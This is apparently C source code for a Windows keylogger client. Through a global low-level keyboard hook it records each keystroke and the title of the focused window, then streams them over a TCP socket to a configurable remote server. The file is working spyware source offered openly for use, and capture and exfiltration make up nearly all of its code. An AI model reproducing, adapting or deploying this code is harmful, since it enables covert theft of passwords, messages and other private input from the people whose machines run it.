/*
 * win_client.c
 * A client program that captures window title and keystrokes,
 * translates the keys and then send them to the server.
*/

#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

#define HOST "192.168.0.132"    // CHANGE ME
#define PORT 6666           // CHANGE ME

// Macro for simplier send() calls
#define log(msg, ...) send(connection, msg, sizeof(msg), 0)

// globals
char curr_window_title[256] = { 0 };    // Contains current window title
char prev_window_title[256] = { 0 };    // Containts the previous window title
char window_title[256 + 20] = { 0 };    // Final formatted string of window title to be sent to server
HWND curr_window_handle;                // Current window handle.
HWND prev_window_handle;                // Previous window handle.
SOCKET connection = INVALID_SOCKET;     // Socket connection with server.
HHOOK hook = { 0 };                     // The keyboard hook handle


/*
 * Opens a connection to the server.
 * Returns socket connection.
 */
SOCKET open_connection()
{
    WSADATA wsa_data = { 0 };
    struct sockaddr_in server_addr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return 1;
    }

    // Create a socket
    if ((connection = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // Set up the server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(HOST);
    server_addr.sin_port = htons(PORT);

    // Connect to the server
    while (connect(connection, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        Sleep(1);
    }

    return connection;
}

/*
 * Updates the window title using the current window handle
 */
void update_window()
{
    memset(&prev_window_title, 0, sizeof(prev_window_title));
    memcpy(prev_window_title, curr_window_title, sizeof(curr_window_title));

    prev_window_handle = curr_window_handle;

    memset(&window_title, 0, sizeof(window_title));
    sprintf(window_title, "\n\nFocused Window: %s\n\n", curr_window_title);
    log(window_title);
}

/*
 * The hook function that is called everytime a key is pressed
 */
LRESULT CALLBACK ll_keyboard_proc(int n_code, WPARAM hook_message, LPARAM p_keyboard_struct)
{
    // Check window and update if needed.
    curr_window_handle = GetForegroundWindow();
    if (curr_window_handle) {
        GetWindowText(curr_window_handle, curr_window_title, sizeof(curr_window_title));
        if (strcmp(curr_window_title, prev_window_title) || curr_window_handle != prev_window_handle) {
            update_window();
        }
    }

    if (n_code == HC_ACTION) {

        KBDLLHOOKSTRUCT* kb_struct = (KBDLLHOOKSTRUCT*)p_keyboard_struct;

        if (hook_message == WM_KEYDOWN || hook_message == WM_SYSKEYDOWN) {

            BYTE keyboard_state[256] = { 0 };
            char ascii_buff[4] = { 0 };
            HKL keyboard_layout = GetKeyboardLayout(0);

            GetKeyboardState(keyboard_state);
            UINT vk_code = kb_struct->vkCode;
            UINT scan_code = kb_struct->scanCode;

            // If high bit is set to high then button is pressed
            BOOL shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

            // if lower bit is set to 1 then it means it's toggled
            BOOL caps_toggled = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

            if (shift_pressed) {
                keyboard_state[VK_SHIFT] = 0x80;
            } else {
                keyboard_state[VK_SHIFT] = 0x00;
            }

            if (caps_toggled) {
                keyboard_state[VK_CAPITAL] = 0x0001;
            } else {
                keyboard_state[VK_CAPITAL] = 0x0000;
            }

            // Some special cases
            switch (vk_code) {

            case VK_RETURN:
                log(" [ENTER]\n");
                break;

            case VK_TAB:
                log(" [TAB] ");
                break;

            case VK_LMENU:
                log(" [LALT] ");
                break;

            case VK_RMENU:
                log(" [RALT] ");
                break;

            case VK_LWIN:
                log(" [LWIN] ");
                break;

            case VK_SHIFT:
                log(" [SHIFT] ");
                break;

            case VK_LCONTROL:
                log(" [LCTRL] ");
                break;

            case VK_RCONTROL:
                log(" [RCTRL] ");
                break;

                // This will handle keys like (a-z, 0-9, !@#/?... etc)
            default:

                if (ToAsciiEx(vk_code, scan_code, keyboard_state, (LPWORD)ascii_buff, 0, keyboard_layout) > 0) {
                    log(ascii_buff);
                }
                break;
            }
        }
    }

    return CallNextHookEx(NULL, n_code, hook_message, p_keyboard_struct);
}

/*
 * Unhooks the hook and closes connection with server.
 */
void clean_exit()
{
    UnhookWindowsHookEx(hook);

    // Close the socket and clean up Winsock
    closesocket(connection);
    WSACleanup();
}

int main()
{

    atexit(clean_exit);

    connection = open_connection();

    hook = SetWindowsHookEx(WH_KEYBOARD_LL, ll_keyboard_proc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
